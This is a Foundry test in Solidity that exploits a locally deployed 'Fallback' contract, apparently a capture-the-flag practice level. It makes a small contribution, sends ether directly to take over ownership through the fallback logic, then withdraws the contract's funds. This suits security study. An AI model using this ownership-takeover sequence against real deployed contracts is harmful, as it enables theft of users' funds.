// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

contract FallbackAttackTest is Test {
    Fallback public target;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        target = new Fallback();
        vm.deal(attacker, 1 ether);
    }

    function test_attack() public {
        vm.startPrank(attacker);

        assertNotEq(target.owner(), attacker, "attack not started yet");

        target.contribute{value: 0.0001 ether}();
        assertGt(target.contributions(attacker), 0, "contribution failed");

        (bool success,) = address(target).call{value: 0.0001 ether}("");
        require(success, "transfer failed");

        assertEq(target.owner(), attacker, "owner takeover failed");

        uint256 balanceBefore = attacker.balance;
        target.withdraw();
        assertGt(attacker.balance, balanceBefore, "withdraw failed");

        vm.stopPrank();

        console.log("Attack successful!");
        console.log("Attacker balance after:", attacker.balance);
    }
}
